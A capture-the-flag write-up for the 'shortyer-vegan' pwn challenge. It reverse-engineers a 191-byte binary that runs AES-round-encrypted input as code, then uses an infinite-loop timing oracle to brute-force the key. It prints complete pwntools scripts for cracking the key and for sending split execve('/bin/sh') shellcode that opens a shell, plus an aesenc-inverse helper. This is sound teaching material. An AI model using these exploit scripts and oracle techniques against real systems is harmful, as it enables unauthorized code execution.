## Description

For this challenge, we are given a single binary `main`. The challenge follows with the description:

> It's only 200 bytes, how hard could it be?
> 
> Running at `shortyer.ctf:1337`.

The challenge initially suffered from an unintended. This lead to the release of a revenge challenge, which changed the description to:

> It's only 200^W191 bytes, how hard could it be?
> 
> Running at `shortyer-vegan.ctf:1337`.

This writeup is for the vegan version of the challenge. To solve the original, you could simply execute shellcode by providing an invalid input length.

---

## TLDR

Utilizing infinite loops to as an oracle, it is possible to brute-force bytes of the remote key. Once the remote key is known, the challenge is as simple as supplying an execve payload to drop a shell.

---

## Recon

### Overview

Opening the file in ida, it's immediately clear that the program isn't compiled. ida gives about 10 thousand warnings before letting us continue, and it also doesn't find any functions.

As the program is fairly small, I will first give a short run-through of its functionality.

```assembly
push    79656Bh
mov     rdi, rsp
xor     esi, esi
push    2
pop     rax
syscall                 ; LINUX - sys_open
mov     rdi, rax
lea     rsi, qword_1C0
push    10h
pop     rdx
xor     rax, rax
syscall                 ; LINUX - sys_read
cmp     rax, rdx
jnz     short loc_B7
```

The program starts by opening a file that turns out to be "key". It then reads the contents of the file, after which it ends execution if the content length is less than 16.

What follows is the loop that can be seen below:

```assembly
loc_86:                                 ; CODE XREF: LOAD:00000000000000B5↓j
movaps  xmm0, xmmword ptr [rsi] ; Load key into xmm0
add     rsi, rdx        ; Increment pointer by 16
xor     rdi, rdi
xor     rax, rax
syscall                 ; LINUX - sys_read
movaps  xmm1, xmmword ptr [rsi] ; Load user input into xmm1
pxor    xmm2, xmm2      ; Clear xmm2 register
pcmpeqb xmm2, xmm1      ; Compare cleared xmm2 to xmm1
vpmovmskb eax, xmm2     ; Move byte mask (upper bits) into eax
cmp     ax, 0FFFFh      ; Byte mask set is equal to xmm1 == xmm2
jz      near ptr qword_1D0 ; Jump if user input was null
aesenc  xmm1, xmm0      ; Run single round of AES encryption on user input
movaps  xmmword ptr [rsi], xmm1 ; Save encrypted input
jmp     short loc_86    ; Jump to top
```

This code was a bit hard to understand initially, as it makes use of the XMM registers and accompanying opcodes. To summarize, the code does the following:

1. Take user input
2. If user input is null, jump to previous encrypted input
3. Encrypt user input with key
4. Make encrypted input new key
5. Repeat from 1

The code makes use of the `aesenc` opcode, which does a single round of AES encryption.

### The goal

Reading the code, it's clear that the objective is to execute arbitrary shellcode. However, all user input is encrypted. Since there is no apparent way to bypass the encryption, it should be mostly clear, that the challenge can only be solved by somehow extracting the key stored in the `key` file.

This is easier said than done. The obvious solution is to break it down into a series of smaller brute forces, then somehow calculate the key by observing program behavior. But since the program doesn't write anything to the user, there is no clear way to gauge the effect of our input.

In fact, since the program jumps to the code instead of calling it, you can't simply return to main loop, which could be used as an oracle since the program would continue execution.

### Analyzing program state

In order for this to be exploitable, there has to be something useful going in the registers upon code execution. Send 16 bytes of garbage, representing our payload, followed by 16 null bytes to end the main loop, we can break upon our code being called. Checking the registers, we see the following:

```
 RAX  0xffff
 RBX  0x0
 RCX  0x7f0c4d1b8094 ◂— movaps xmm1, xmmword ptr [rsi] /* 0x66d2ef0f660e280f */
 RDX  0x10
 RDI  0x0
 RSI  0x7f0c4d1b81e0 ◂— 0
 R8   0x0
 R9   0x0
 R10  0x0
 R11  0x346
 R12  0x0
 R13  0x0
 R14  0x0
 R15  0x0
 RBP  0x0
 RSP  0x7ffe67d87ef8 ◂— 0x79656b /* 'key' */
*RIP  0x7f0c4d1b81d0 ◂— ret 0xc2c2 /* 0xc2c2c2c2c2c2c2c2 */
```

There is really only two pointers of interest in here. `RSI` is pointing at our newest input, which consists of only null bytes. However, `RCX` is actually pointing back into the program. Disassembling a few lines at that address, we see the following:

```assembly
movaps xmm1,XMMWORD PTR [rsi]
pxor   xmm2,xmm2
pcmpeqb xmm2,xmm1
vpmovmskb eax,xmm2
cmp    ax,0xffff
je     0x7f0c4d1b81d0
```

It's pointing straight back into our main loop. Imagine what would happen if the program were to jump to this address. Since `RSI` is holding our most recent input, null would be loaded into `xmm1`. The subsequent comparison would turn out positive, resulting in the code jumping, straight back to where we are now. The result is an infinite loop, which is definitely a useful oracle.

As it turns, this fact is actually not entirely necessary. However, since that was my initial approach, I have kept the writeup as is.

### The inverse of aesenc

The program makes use of the `aesenc` instruction to encrypt user input. This function is equivalent to one round of AES encryption. A single round of AES encryption boils down to the following steps:

1. **SubBytes**: Each input byte is substituted using a substitution box. This box maps such that any substituted byte can be inverse substituted to its original value.
![](subbytes.png)

2. **ShiftRows**: Rows of the matrix are shifted to the left corresponding to their row number.
![](shiftrows.png)

3. **MixColumns**: Columns of the matrix are combined using an invertible linear transformation.
![](mixcolumns.png)

4. **AddRoundKey**: Each byte in the matrix is xored with with a corresponding byte from the round key.
![](addroundkey.png)

The MixColumns step is the one that confused me the most. However, all parts of the algorithm are reversible. Notably, the inverse of this process is not the `aesdec` instruction. For this challenge, I borrowed code I found in [this amazing writeup by Nofix](https://nofix.re/posts/2023-29-08-barbhack2023-encrypted_box.markdown/).

---

## Exploitation

### Cracking first byte

As described earlier, we have a potential oracle by jumping to the address in the `RCX` register. Since this can't be done with a single opcode, we will have to brute force at least two bytes in order to get the desired loop.

In order to get an idea of the inputs that cause such a loop, I set up a test with a known key using the following code:

```python
def try_payload(payload):
    """ Test input for infinite loop """

    conn = start()

    conn.send(payload)  # Send payload to be encrypted
    conn.send(b"\x00" * 16)  # Terminate loop by null bytes
    res = False

    try:
        # If program hasn't crashed, we have a loop

        conn.recv(timeout=0.05)
        res = True
    except:
        # If the program has crashed, we get an exception

        pass
    
    conn.close()
    return res

c = AES()

for i in range(256):
    for j in range(256):
        payload = bytes((i, j)) + b"\x00" * 14  # Random input
        payload = c.AESENCINV(payload, b"A" * 16)  # Key is A * 16

        if try_payload(payload):
            print(f"{hex(i)[2:].rjust(2, '0')}{hex(j)[2:].rjust(2, '0')}")

```

To my surprise, this doesn't just return a few results. First of all, we have infinite loops on a range of opcodes, including:

- `JNO`
- `JAE`
- `JE`
- `JBE`
- `JNS`
- `JP`
- `JGE`
- `JLE`
- `LOOPE`
- `LOOP`
- `JMP`

In this case, these are all relative jumps, taking an offset as a parameter, ranging between 0 and 13. This gives a total of 14 hits on all of them. I noted them down in my code, as they may be useful for figuring out the key.

On top of these general matches, we also have a few special ones, notably:

- `51c3`:  `push RCX; ret;`
- `ffe1`:  `jmp RCX;`

These are both unique, in that they both have unique first bytes, that distinguish them from the rest. I also learned, that we occasionally have a loop at `51c2`, which is `push RCX; RET imm16;` in assembly. However, I have chosen to disregard it, as it only works on a small range of `RET` values, values that we can't actually control yet.

When attacking the remote, our input will of course be encrypted. By using the inverse of `aesenc` on null bytes, the resulting encryption on the remote, is the result of an xor between our local key and the remote key. If the given payload results in a loop, we know that the result of this xor is code that loops. By xoring that with the known code, we get the bytes of the remote key. Take the following script:

```python
c = AES()
loop_bytes = []

# Get a progress bar going
for i in tqdm(range(256)):
    for j in range(256):

        # Random local key
        key = bytes((i, j)) + b"\x00" * 14

        # Executed code on remote is equal to local key ^ remote key
        payload = c.AESENCINV(b"\x00" * 16, key)

        if try_payload(payload):

            # The payload caused a loop, save the first byte
            loop_bytes.append(i)
```

Once we have collected these matches, we must xor them with their corresponding code. Since there are only two codes with unique first bytes, we will initially generate two possible bytes for the remote key:

```python
def get_first(loop_bytes):
    """ Finds the first byte of the remote key from looping inputsd """

    # Isolate payloads with unique first bytes. This takes 51c2 into account
    singles = [c for c in loop_bytes if loop_bytes.count(c) in {1, 2}]
    singles = list(set(singles))

    # Isolate remaining relative jumps
    multiples = list(set(c for c in loop_bytes if c not in singles))

    # Must be only two payloads with unique first bytes
    assert len(singles) == 2

    # Generate two possible key bytes
    k_pos1 = singles[0] ^ valid_singles[0]
    k_pos2 = singles[0] ^ valid_singles[1]

    # Check whether which possible key byte matches with remaining loops
    if all(c ^ k_pos1 in valid_multiples for c in multiples):
        k_byte1 = k_pos1

    elif all(c ^ k_pos2 in valid_multiples for c in multiples):
        k_byte1 = k_pos2

    else:
        raise ValueError("Valid key-byte not found")

    return k_byte1


valid_singles = [0x51, 0xff]
valid_multiples = [0xe2, 0xeb, 0x76, 0xe1, 0x79, 0x7e, 0xe9, 0x71, 0x74, 0x73, 0x7d, 0x7a]
```

We can then find the correct of these two possible key bytes, by xoring the given byte with the remaining matches. The one that generates the opcodes in `valid_multiples` must then be correct.

This process is slightly confusing, but it does result in us cracking the first key-byte in about 6 minutes of brute forcing.

### Cracking the rest of the key

Once the first byte of the key has been cracked, the rest of the process becomes a lot easier. We will use `jmp RCX;` as a crib, which we will inverse encrypt with our known key + a random byte. Once the remote hangs, we know that the random byte must be correct. We can then repeat the process, padding the crib with NOP's to extend shellcode:

```python
key = bytearray(16)
key[0] = get_first(loop_bytes)
crib = asm("jmp rcx;")  # Target ciphertext

for i in tqdm(range(1, 16)):
    for j in range(256):
        # Use new byte as key guess
        key[i] = j

        # Pad crib with NOPs
        payload = b"\x90" * (i - 1) + crib

        # Pad payload with null bytes
        payload = payload.ljust(16, b"\x00")

        # Encrypt using key-guess
        payload = c.AESENCINV(payload, key)

        if try_payload(payload):
            break

    else:
        raise ValueError("Did not find key-byte")


print(key)
```

Running the complete script, it should be able to leak the remote key.

### Dropping a shell

Having leaked the remote key, it's now just a question of exploiting the program. As we are limited to just 16 bytes per input, we must split our payload in two. This is possible, since the program places the encrypted inputs sequentially. The code below does just that:

```python
conn = start()
c = AES()

# Initial key leaked with crack_key.py
key = bytearray(b'\xaa\xb2*\xc4\xc5\xdc\x02\x16\xbeOe\xb8\x0c\xdc\xbc\xbe')

# Shellcode part one
shellcode1 = asm('''
    xor esi, esi
    xor edx, edx
	mov rdi, 0x0068732f6e69622f
	push rdi
	push rsp
''').ljust(16, b"\x90")

# Encrypt first payload with initial key
payload1 = c.AESENCINV(shellcode1, key)

# Shellcode part two
shellcode2 = asm('''
	pop	rdi
	xor eax, eax
	mov al,	59
	syscall
''').ljust(16, b"\x00")

# Encrypt with previous encrypted input
payload2 = c.AESENCINV(shellcode2, shellcode1)

# Send all input
conn.send(payload1)
conn.send(payload2)
conn.send(b"\x00" * 16)

conn.interactive()
```

Given a correct `key`, this should result in a shell.

---

## Solution

Below are scripts to both get the key and to drop a shell, along with the code 
I used to reverse `aesenc`, credit to [Nofix](https://nofix.re/posts/2023-29-08-barbhack2023-encrypted_box.markdown/). Our team didn't manage to solve this challenge during the CTF. Despite that, this is one of my favorite challenges from the CTF :)

```python
from pwn import *
from aes import AES
from tqdm import tqdm

BINARY = "./main"
HOST = "shortyer-vegan.ctf"
PORT = 1337

elf = context.binary = ELF(BINARY, checksec=False)

context.log_level = "WARNING"
context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P', '-p', '70']
context.gdbinit = "~/.gdbinit_splitmind"
env = {} # {"LD_LIBRARY_PATH": "./", "LD_PRELOAD": ""}
gdbscript = '''
'''

def start():
    if args.REMOTE:
        return connect(HOST, PORT)
    elif args.RAW:
        return process(BINARY, env=env)
    else:
        return gdb.debug(BINARY, gdbscript=gdbscript, env=env)

def try_payload(payload):
    """ Test input for infinite loop """

    conn = start()

    conn.send(payload)  # Send payload to be encrypted
    conn.send(b"\x00" * 16)  # Terminate loop by null bytes
    res = False

    try:
        # If program hasn't crashed, we have a loop

        conn.recv(timeout=0.05)
        res = True
    except:
        # If the program has crashed, we get an exception

        pass

    conn.close()
    return res

def get_first(loop_bytes):
    """ Finds the first byte of the remote key from looping inputsd """

    # Isolate payloads with unique first bytes. This takes 51c2 into account
    singles = [c for c in loop_bytes if loop_bytes.count(c) in {1, 2}]
    singles = list(set(singles))

    # Isolate remaining relative jumps
    multiples = list(set(c for c in loop_bytes if c not in singles))

    # Must be only two payloads with unique first bytes
    assert len(singles) == 2

    # Generate two possible key bytes
    k_pos1 = singles[0] ^ valid_singles[0]
    k_pos2 = singles[0] ^ valid_singles[1]

    # Check whether which possible key byte matches with remaining loops
    if all(c ^ k_pos1 in valid_multiples for c in multiples):
        k_byte1 = k_pos1

    elif all(c ^ k_pos2 in valid_multiples for c in multiples):
        k_byte1 = k_pos2

    else:
        raise ValueError("Valid key-byte not found")

    return k_byte1


# First byte of looping shellcodes
valid_singles = [0x51, 0xff]
valid_multiples = [0xe2, 0xeb, 0x76, 0xe1, 0x79, 0x7e, 0xe9, 0x71, 0x74, 0x73, 0x7d, 0x7a]

# Importing from aes.py
c = AES()
loop_bytes = []

# Get a progress bar going
for i in tqdm(range(256)):
    for j in range(256):

        # Random local key
        key = bytes((i, j)) + b"\x00" * 14

        # Executed code on remote is equal to local key ^ remote key
        payload = c.AESENCINV(b"\x00" * 16, key)

        if try_payload(payload):

            # The payload caused a loop, save the first byte
            loop_bytes.append(i)

# Get the first byte
key = bytearray(16)
key[0] = get_first(loop_bytes)
crib = asm("jmp rcx;")  # Target ciphertext

for i in tqdm(range(1, 16)):
    for j in range(256):
        # Use new byte as key guess
        key[i] = j

        # Pad crib with NOPs
        payload = b"\x90" * (i - 1) + crib

        # Pad payload with null bytes
        payload = payload.ljust(16, b"\x00")

        # Encrypt using key-guess
        payload = c.AESENCINV(payload, key)

        if try_payload(payload):
            break

    else:
        raise ValueError("Did not find key-byte")

print(key)
```

```python
from pwn import *
from aes import AES

BINARY = "./main"
HOST = "shortyer-vegan.ctf"
PORT = 1337

elf = context.binary = ELF(BINARY, checksec=False)

context.log_level = "WARNING"
context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P', '-p', '70']
context.gdbinit = "~/.gdbinit_splitmind"
env = {} # {"LD_LIBRARY_PATH": "./", "LD_PRELOAD": ""}
gdbscript = '''
'''

def start():
    if args.REMOTE:
        return connect(HOST, PORT)
    elif args.RAW:
        return process(BINARY, env=env)
    else:
        return gdb.debug(BINARY, gdbscript=gdbscript, env=env)

conn = start()
c = AES()

# Initial key leaked with crack_key.py
key = bytearray(b'\xaa\xb2*\xc4\xc5\xdc\x02\x16\xbeOe\xb8\x0c\xdc\xbc\xbe')

# Shellcode part one
shellcode1 = asm('''
    xor esi, esi
    xor edx, edx
	mov rdi, 0x0068732f6e69622f
	push rdi
	push rsp
''').ljust(16, b"\x90")

# Encrypt first payload with initial key
payload1 = c.AESENCINV(shellcode1, key)

# Shellcode part two
shellcode2 = asm('''
	pop	rdi
	xor eax, eax
	mov al,	59
	syscall
''').ljust(16, b"\x00")

# Encrypt with previous encrypted input
payload2 = c.AESENCINV(shellcode2, shellcode1)

# Send all input
conn.send(payload1)
conn.send(payload2)
conn.send(b"\x00" * 16)

conn.interactive()
```

```python
def xor(a, b):
    return ''.join(chr(ord(ac) ^ ord(bc)) for ac, bc in zip(a, b))


Sbox = (
    0x63, 0x7C, 0x77, 0x7B, 0xF2, 0x6B, 0x6F, 0xC5, 0x30, 0x01, 0x67, 0x2B, 0xFE, 0xD7, 0xAB, 0x76,
    0xCA, 0x82, 0xC9, 0x7D, 0xFA, 0x59, 0x47, 0xF0, 0xAD, 0xD4, 0xA2, 0xAF, 0x9C, 0xA4, 0x72, 0xC0,
    0xB7, 0xFD, 0x93, 0x26, 0x36, 0x3F, 0xF7, 0xCC, 0x34, 0xA5, 0xE5, 0xF1, 0x71, 0xD8, 0x31, 0x15,
    0x04, 0xC7, 0x23, 0xC3, 0x18, 0x96, 0x05, 0x9A, 0x07, 0x12, 0x80, 0xE2, 0xEB, 0x27, 0xB2, 0x75,
    0x09, 0x83, 0x2C, 0x1A, 0x1B, 0x6E, 0x5A, 0xA0, 0x52, 0x3B, 0xD6, 0xB3, 0x29, 0xE3, 0x2F, 0x84,
    0x53, 0xD1, 0x00, 0xED, 0x20, 0xFC, 0xB1, 0x5B, 0x6A, 0xCB, 0xBE, 0x39, 0x4A, 0x4C, 0x58, 0xCF,
    0xD0, 0xEF, 0xAA, 0xFB, 0x43, 0x4D, 0x33, 0x85, 0x45, 0xF9, 0x02, 0x7F, 0x50, 0x3C, 0x9F, 0xA8,
    0x51, 0xA3, 0x40, 0x8F, 0x92, 0x9D, 0x38, 0xF5, 0xBC, 0xB6, 0xDA, 0x21, 0x10, 0xFF, 0xF3, 0xD2,
    0xCD, 0x0C, 0x13, 0xEC, 0x5F, 0x97, 0x44, 0x17, 0xC4, 0xA7, 0x7E, 0x3D, 0x64, 0x5D, 0x19, 0x73,
    0x60, 0x81, 0x4F, 0xDC, 0x22, 0x2A, 0x90, 0x88, 0x46, 0xEE, 0xB8, 0x14, 0xDE, 0x5E, 0x0B, 0xDB,
    0xE0, 0x32, 0x3A, 0x0A, 0x49, 0x06, 0x24, 0x5C, 0xC2, 0xD3, 0xAC, 0x62, 0x91, 0x95, 0xE4, 0x79,
    0xE7, 0xC8, 0x37, 0x6D, 0x8D, 0xD5, 0x4E, 0xA9, 0x6C, 0x56, 0xF4, 0xEA, 0x65, 0x7A, 0xAE, 0x08,
    0xBA, 0x78, 0x25, 0x2E, 0x1C, 0xA6, 0xB4, 0xC6, 0xE8, 0xDD, 0x74, 0x1F, 0x4B, 0xBD, 0x8B, 0x8A,
    0x70, 0x3E, 0xB5, 0x66, 0x48, 0x03, 0xF6, 0x0E, 0x61, 0x35, 0x57, 0xB9, 0x86, 0xC1, 0x1D, 0x9E,
    0xE1, 0xF8, 0x98, 0x11, 0x69, 0xD9, 0x8E, 0x94, 0x9B, 0x1E, 0x87, 0xE9, 0xCE, 0x55, 0x28, 0xDF,
    0x8C, 0xA1, 0x89, 0x0D, 0xBF, 0xE6, 0x42, 0x68, 0x41, 0x99, 0x2D, 0x0F, 0xB0, 0x54, 0xBB, 0x16,
)

InvSbox = (
    0x52, 0x09, 0x6A, 0xD5, 0x30, 0x36, 0xA5, 0x38, 0xBF, 0x40, 0xA3, 0x9E, 0x81, 0xF3, 0xD7, 0xFB,
    0x7C, 0xE3, 0x39, 0x82, 0x9B, 0x2F, 0xFF, 0x87, 0x34, 0x8E, 0x43, 0x44, 0xC4, 0xDE, 0xE9, 0xCB,
    0x54, 0x7B, 0x94, 0x32, 0xA6, 0xC2, 0x23, 0x3D, 0xEE, 0x4C, 0x95, 0x0B, 0x42, 0xFA, 0xC3, 0x4E,
    0x08, 0x2E, 0xA1, 0x66, 0x28, 0xD9, 0x24, 0xB2, 0x76, 0x5B, 0xA2, 0x49, 0x6D, 0x8B, 0xD1, 0x25,
    0x72, 0xF8, 0xF6, 0x64, 0x86, 0x68, 0x98, 0x16, 0xD4, 0xA4, 0x5C, 0xCC, 0x5D, 0x65, 0xB6, 0x92,
    0x6C, 0x70, 0x48, 0x50, 0xFD, 0xED, 0xB9, 0xDA, 0x5E, 0x15, 0x46, 0x57, 0xA7, 0x8D, 0x9D, 0x84,
    0x90, 0xD8, 0xAB, 0x00, 0x8C, 0xBC, 0xD3, 0x0A, 0xF7, 0xE4, 0x58, 0x05, 0xB8, 0xB3, 0x45, 0x06,
    0xD0, 0x2C, 0x1E, 0x8F, 0xCA, 0x3F, 0x0F, 0x02, 0xC1, 0xAF, 0xBD, 0x03, 0x01, 0x13, 0x8A, 0x6B,
    0x3A, 0x91, 0x11, 0x41, 0x4F, 0x67, 0xDC, 0xEA, 0x97, 0xF2, 0xCF, 0xCE, 0xF0, 0xB4, 0xE6, 0x73,
    0x96, 0xAC, 0x74, 0x22, 0xE7, 0xAD, 0x35, 0x85, 0xE2, 0xF9, 0x37, 0xE8, 0x1C, 0x75, 0xDF, 0x6E,
    0x47, 0xF1, 0x1A, 0x71, 0x1D, 0x29, 0xC5, 0x89, 0x6F, 0xB7, 0x62, 0x0E, 0xAA, 0x18, 0xBE, 0x1B,
    0xFC, 0x56, 0x3E, 0x4B, 0xC6, 0xD2, 0x79, 0x20, 0x9A, 0xDB, 0xC0, 0xFE, 0x78, 0xCD, 0x5A, 0xF4,
    0x1F, 0xDD, 0xA8, 0x33, 0x88, 0x07, 0xC7, 0x31, 0xB1, 0x12, 0x10, 0x59, 0x27, 0x80, 0xEC, 0x5F,
    0x60, 0x51, 0x7F, 0xA9, 0x19, 0xB5, 0x4A, 0x0D, 0x2D, 0xE5, 0x7A, 0x9F, 0x93, 0xC9, 0x9C, 0xEF,
    0xA0, 0xE0, 0x3B, 0x4D, 0xAE, 0x2A, 0xF5, 0xB0, 0xC8, 0xEB, 0xBB, 0x3C, 0x83, 0x53, 0x99, 0x61,
    0x17, 0x2B, 0x04, 0x7E, 0xBA, 0x77, 0xD6, 0x26, 0xE1, 0x69, 0x14, 0x63, 0x55, 0x21, 0x0C, 0x7D,
)

xtime = lambda a: (((a << 1) ^ 0x1B) & 0xFF) if (a & 0x80) else (a << 1)

Rcon = (
    0x00, 0x01, 0x02, 0x04, 0x08, 0x10, 0x20, 0x40,
    0x80, 0x1B, 0x36, 0x6C, 0xD8, 0xAB, 0x4D, 0x9A,
    0x2F, 0x5E, 0xBC, 0x63, 0xC6, 0x97, 0x35, 0x6A,
    0xD4, 0xB3, 0x7D, 0xFA, 0xEF, 0xC5, 0x91, 0x39,
)


def text2matrix(text):
    matrix = []
    for i in range(16):
        byte = text[i]
        if i % 4 == 0:
            matrix.append([byte])
        else:
            matrix[i // 4].append(byte)
    return matrix


def matrix2text(matrix):
    text = []
    for i in range(4):
        for j in range(4):
            text.append(matrix[i][j])
    return bytes(text)


class AES:
    def init(self, master_key=None):
        if master_key:
            self.change_key(master_key)

    def change_key(self, master_key):
        self.round_keys = text2matrix(master_key)

        for i in range(4, 4 * 11):
            self.round_keys.append([])
            if i % 4 == 0:
                byte = self.round_keys[i - 4][0] \
                       ^ Sbox[self.round_keys[i - 1][1]] \
                       ^ Rcon[i // 4]
                self.round_keys[i].append(byte)

                for j in range(1, 4):
                    byte = self.round_keys[i - 4][j] \
                           ^ Sbox[self.round_keys[i - 1][(j + 1) % 4]]
                    self.round_keys[i].append(byte)
            else:
                for j in range(4):
                    byte = self.round_keys[i - 4][j] \
                           ^ self.round_keys[i - 1][j]
                    self.round_keys[i].append(byte)

    def encrypt(self, plaintext):
        self.plain_state = text2matrix(plaintext)
        self.add_round_key(self.plain_state, self.round_keys[:4])
        for i in range(1, 10):
            self.round_encrypt(self.plain_state, self.round_keys[4 * i: 4 * (i + 1)])
        self.sub_bytes(self.plain_state)
        self.shift_rows(self.plain_state)
        self.add_round_key(self.plain_state, self.round_keys[40:])

        return matrix2text(self.plain_state)


    def AESENCLAST(self, plaintext, round_key):
        state = text2matrix(plaintext)
        rkey = text2matrix(round_key)
        
        self.sub_bytes(state)
        self.shift_rows(state)
        self.add_round_key(state, rkey)

        return matrix2text(state)

    def AESENC(self, plaintext, round_key):
        state = text2matrix(plaintext)
        rkey = text2matrix(round_key)

        self.shift_rows(state)
        self.sub_bytes(state)
        self.mix_columns(state)
        self.add_round_key(state, rkey)

        return matrix2text(state)

    def AESDECINV(self, plaintext, round_key):
        state = text2matrix(plaintext)
        rkey = text2matrix(round_key)

        self.add_round_key(state, rkey)
        self.mix_columns(state)
        self.sub_bytes(state)
        self.shift_rows(state)

        return matrix2text(state)

    def AESDECLAST(self, ciphertext, round_key):
        state = text2matrix(ciphertext)
        rkey = text2matrix(round_key)

        self.add_round_key(state, rkey)
        self.inv_sub_bytes(state)
        self.inv_shift_rows(state)

        return matrix2text(state)

    def AESDEC(self, ciphertext, round_key):
        state = text2matrix(ciphertext)
        rkey = text2matrix(round_key)
        
        self.inv_shift_rows(state)
        self.inv_sub_bytes(state)
        self.inv_mix_columns(state)
        self.add_round_key(state, rkey)

        return matrix2text(state)

    def AESENCINV(self, ciphertext, round_key):
        state = text2matrix(ciphertext)
        rkey = text2matrix(round_key)

        self.add_round_key(state, rkey)
        self.inv_mix_columns(state)
        self.inv_sub_bytes(state)
        self.inv_shift_rows(state)
        

        return matrix2text(state)

    def decrypt(self, ciphertext):
        self.cipher_state = text2matrix(ciphertext)
        self.add_round_key(self.cipher_state, self.round_keys[40:])
        self.inv_shift_rows(self.cipher_state)
        self.inv_sub_bytes(self.cipher_state)
        for i in range(9, 0, -1):
            self.round_decrypt(self.cipher_state, self.round_keys[4 * i: 4 * (i + 1)])
        self.add_round_key(self.cipher_state, self.round_keys[:4])
        return matrix2text(self.cipher_state)

    def add_round_key(self, s, k):
        for i in range(4):
            for j in range(4):
                s[i][j] ^= k[i][j]

    def sr_encrypt(self, plaintext, key):
        state_matrix = text2matrix(plaintext)
        key_matrix = text2matrix(key)

        self.round_encrypt(state_matrix, key_matrix)

        return matrix2text(state_matrix)

    def round_encrypt(self, state_matrix, key_matrix):
        self.sub_bytes(state_matrix)
        self.shift_rows(state_matrix)
        self.mix_columns(state_matrix)
        self.add_round_key(state_matrix, key_matrix)

    def sr_decryptlast(self, plaintext, key):
        state_matrix = text2matrix(plaintext)
        key_matrix = text2matrix(key)
        self.add_round_key(state_matrix, key_matrix)
        self.inv_shift_rows(state_matrix)
        self.inv_sub_bytes(state_matrix)
        return matrix2text(state_matrix)

    def sr_decrypt(self, plaintext, key):
        state_matrix = text2matrix(plaintext)
        key_matrix = text2matrix(key)

        self.round_decrypt(state_matrix, key_matrix)

        return matrix2text(state_matrix)

    def round_decrypt(self, state_matrix, key_matrix):
        self.add_round_key(state_matrix, key_matrix)
        self.inv_shift_rows(state_matrix)
        self.inv_sub_bytes(state_matrix)

    def sub_bytes(self, s):
        for i in range(4):
            for j in range(4):
                s[i][j] = Sbox[s[i][j]]

    def x_sub_bytes(self, s):
        s = text2matrix(s)
        self.sub_bytes(s)
        return matrix2text(s)

    def x_mix_columns(self, s):
        s = text2matrix(s)
        self.mix_columns(s)
        return matrix2text(s)

    def x_inv_sub_bytes(self, s):
        s = text2matrix(s)
        self.inv_sub_bytes(s)
        return matrix2text(s)

    def x_inv_mix_columns(self, s):
        s = text2matrix(s)
        self.inv_mix_columns(s)
        return matrix2text(s)

    def x_inv_shift_rows(self, s):
        s = text2matrix(s)
        self.inv_shift_rows(s)
        return matrix2text(s)

    def x_shift_rows(self, s):
        s = text2matrix(s)
        self.shift_rows(s)
        return matrix2text(s)

    def inv_sub_bytes(self, s):
        for i in range(4):
            for j in range(4):
                s[i][j] = InvSbox[s[i][j]]

    def shift_rows(self, s):
        s[0][1], s[1][1], s[2][1], s[3][1] = s[1][1], s[2][1], s[3][1], s[0][1]
        s[0][2], s[1][2], s[2][2], s[3][2] = s[2][2], s[3][2], s[0][2], s[1][2]
        s[0][3], s[1][3], s[2][3], s[3][3] = s[3][3], s[0][3], s[1][3], s[2][3]

    def inv_shift_rows(self, s):
        s[0][1], s[1][1], s[2][1], s[3][1] = s[3][1], s[0][1], s[1][1], s[2][1]
        s[0][2], s[1][2], s[2][2], s[3][2] = s[2][2], s[3][2], s[0][2], s[1][2]
        s[0][3], s[1][3], s[2][3], s[3][3] = s[1][3], s[2][3], s[3][3], s[0][3]

    def mix_single_column(self, a):
        # please see Sec 4.1.2 in The Design of Rijndael
        t = a[0] ^ a[1] ^ a[2] ^ a[3]
        u = a[0]
        a[0] ^= t ^ xtime(a[0] ^ a[1])
        a[1] ^= t ^ xtime(a[1] ^ a[2])
        a[2] ^= t ^ xtime(a[2] ^ a[3])
        a[3] ^= t ^ xtime(a[3] ^ u)

    def mix_columns(self, s):
        for i in range(4):
            self.mix_single_column(s[i])

    def inv_mix_columns(self, s):
        # see Sec 4.1.3 in The Design of Rijndael
        for i in range(4):
            u = xtime(xtime(s[i][0] ^ s[i][2]))
            v = xtime(xtime(s[i][1] ^ s[i][3]))
            s[i][0] ^= u
            s[i][1] ^= v
            s[i][2] ^= u
            s[i][3] ^= v

        self.mix_columns(s)
```

